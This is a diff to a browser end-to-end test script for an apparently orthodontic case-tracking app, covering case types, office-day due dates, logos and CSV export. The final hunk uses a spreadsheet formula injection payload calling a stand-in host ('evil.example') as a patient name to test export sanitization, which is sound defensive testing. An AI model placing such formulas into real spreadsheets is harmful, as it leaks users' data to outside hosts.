@@ -454,7 +454,7 @@ async function openByName(p, name) {
   check(!(await owner.isVisible('.pickRow[data-g=initial]')), 'no refinement question for a mouthguard');
   await owner.click('.pickRow[data-g=arches] .pick[data-v=Upper]');
   check(await owner.inputValue('#cf-detail') === 'Mouthguard (U)', 'detail reads Mouthguard (U)');
-  check(await owner.inputValue('#cf-dueDate') === await owner.evaluate(() => addClinicDays(todayISO(), 2)), 'due in two clinic days, like retainers');
+  check(await owner.inputValue('#cf-dueDate') === await owner.evaluate(() => addClinicDays(todayISO(), 2)) && await owner.inputValue('#cf-deliveryDate') === await owner.evaluate(() => addClinicDays(todayISO(), 2)), 'due and delivered in two office days, like retainers');
   check(await owner.inputValue('#cf-assignee') === await owner.evaluate(() => meSid()), 'assigned to whoever creates it');
   await owner.click('#ncSave'); await owner.waitForSelector('#modalWrap', { state: 'detached', timeout: 20000 });
   await owner.click('#nav-board'); await owner.fill('#q', ''); await owner.click('[data-act=flow][data-k=retainer]');
@@ -515,7 +515,7 @@ async function openByName(p, name) {
   await owner.evaluate(() => B.createCase({ type: 'inbrace', patient: 'Leona Legacycase', stage: 'dra', detail: 'InBrace IDB', comments: [], createdAt: Date.now(), createdBy: meSid() }));
   await openByName(owner, 'Leona Legacycase');
   await owner.click('#drawer [data-act=edit]'); await owner.waitForSelector('#drawer .cf');
-  check((await owner.getAttribute('#drawer .tt[data-tile=inbrace]', 'aria-checked')) === 'true' && (await owner.locator('#drawer .tt[data-tile]').count()) === (await owner.evaluate(() => TILES.length)), 'an older InBrace case still edits as InBrace');
+  check((await owner.getAttribute('#drawer .tt[data-tile=inbrace]', 'aria-checked')) === 'true' && (await owner.locator('#drawer .tt[data-tile]').count()) === (await owner.evaluate(() => TILES.filter(t => !t.legacy).length + 1)), 'an older InBrace case still edits as InBrace');
   await owner.fill('#drawer #cf-notes', 'legacy-edit-ok');
   await owner.click('[data-act=saveEdit]'); await owner.waitForSelector('#drawer .stepper', { timeout: 20000 });
   check(await owner.isVisible('#drawer .dHd .badge:has-text("InBrace")') && await owner.isVisible('#drawer .txt:has-text("legacy-edit-ok")'), 'saving keeps it InBrace with the change');
@@ -536,8 +536,40 @@ async function openByName(p, name) {
   check(await owner.isVisible('#drawer .badge:has-text("Next Level Express")') && await owner.isVisible('#drawer .txt:has-text("express-edit-ok")'), 'saving the edit doesn’t drop it');
   await owner.click('#drawer [data-act=closeDrawer] >> nth=0');
 
+  console.log('\n# Case types: company logos and pictures; Retreatment retired; Study models; retainers in 2 office days');
+  await owner.click('.topBar [data-act=newCase]'); await owner.waitForSelector('#ncForm');
+  const shown = await owner.locator('#ncForm .tt[data-tile]').evaluateAll(els => els.map(e => e.dataset.tile));
+  check(!shown.includes('retreat') && !shown.includes('misc') && shown.includes('models'), 'no Retreatment or Dr. A (misc.) button; Study models is there');
+  check(!/Dr\. A \(misc|Retreatment/.test(await owner.textContent('#ncForm .tileGrid')), 'the old names are gone from New case');
+  check(await owner.evaluate(() => Array.from(document.querySelectorAll('#ncForm .tt[data-tile]')).every(b => b.querySelector('.tmed img[src^="data:image/png"], .tmed svg.tsvg'))), 'every case type has a logo or a picture');
+  check(await owner.evaluate(() => Object.keys(LOGOS).every(k => document.querySelector('#ncForm .tt[data-tile=' + k + '] .tmed.lg img'))), 'companies show their own logos (' + (await owner.evaluate(() => Object.keys(LOGOS).join(', '))) + ')');
+  check(await owner.evaluate(() => Array.from(document.querySelectorAll('#ncForm .tmed.lg img')).every(i => i.complete && i.naturalWidth > 0)), 'the logos load under the page’s security policy');
+  check(await owner.isVisible('#ncForm .tt[data-tile=nla] .nlf'), 'In-house shows the NL mark');
+  await owner.click('#ncForm .tt[data-tile=retainer]');
+  await owner.fill('#cf-scanDate', '2026-10-07'); // a Wednesday
+  check(await owner.inputValue('#cf-dueDate') === '2026-10-12' && await owner.inputValue('#cf-deliveryDate') === '2026-10-12', 'retainers scanned on a Wednesday are due and delivered Monday (2 office days, Mon–Thu)');
+  await owner.fill('#cf-scanDate', '2026-11-24'); // Tuesday of Thanksgiving week
+  check(await owner.inputValue('#cf-deliveryDate') === '2026-12-01', 'office holidays are skipped (Thanksgiving week → Tuesday Dec 1)');
+  await owner.click('#ncForm .tt[data-tile=models]'); await owner.fill('#cf-patient', 'Mona Modelson');
+  check(await owner.inputValue('#cf-detail') === 'Study models' && await owner.inputValue('#cf-assignee') === await owner.evaluate(() => meSid()), 'Study models: filled in and assigned to whoever creates it');
+  check(await owner.isVisible('.pickRow[data-g=scanner]') && !(await owner.isVisible('.pickRow[data-g=initial]')) && !(await owner.isVisible('.goalGrid')), 'asks for the scanner, not aligner questions');
+  check(await owner.inputValue('#cf-deliveryDate') === '', 'no retainer dates carried over to study models');
+  await owner.click('#ncSave'); await owner.waitForSelector('#modalWrap', { state: 'detached', timeout: 20000 });
+  await owner.click('#nav-board'); await owner.fill('#q', '');
+  check((await owner.locator('[data-act=flow][data-k=retreat]').count()) === 0 && (await owner.locator('[data-act=flow][data-k=misc]').count()) === 0, 'no Retreatment or misc tab on the board');
+  await owner.click('[data-act=flow][data-k=models]');
+  await owner.waitForSelector('section[aria-label="To print"] .kc:has-text("Mona Modelson")', { timeout: 20000 });
+  check(true, 'lands on the Study models board at To print');
+  await owner.evaluate(() => B.createCase({ type: 'retreat', patient: 'Rhea Retreatold', stage: 'review', detail: 'Relapse', comments: [], createdAt: Date.now(), createdBy: meSid() }));
+  await owner.waitForSelector('[data-act=flow][data-k=retreat]', { timeout: 20000 });
+  check(true, 'an older Retreatment case still gets its board tab');
+  await openByName(owner, 'Rhea Retreatold');
+  await owner.click('#drawer [data-act=edit]'); await owner.waitForSelector('#drawer .cf');
+  check((await owner.getAttribute('#drawer .tt[data-tile=retreat]', 'aria-checked')) === 'true', 'and it still edits as Retreatment');
+  await owner.click('#drawer [data-act=cancelEdit]'); await owner.click('#drawer [data-act=closeDrawer] >> nth=0');
+
   console.log('\n# Spreadsheet-formula text is neutralized in the export');
-  await owner.fill('#q', ''); await newCase(owner, { type: 'misc', patient: '=HYPERLINK("http://evil.example/?"&A1,"x")' });
+  await owner.fill('#q', ''); await newCase(owner, { type: 'models', patient: '=HYPERLINK("http://evil.example/?"&A1,"x")' });
 
   console.log('\n# Export');
   await owner.click('#nav-import');
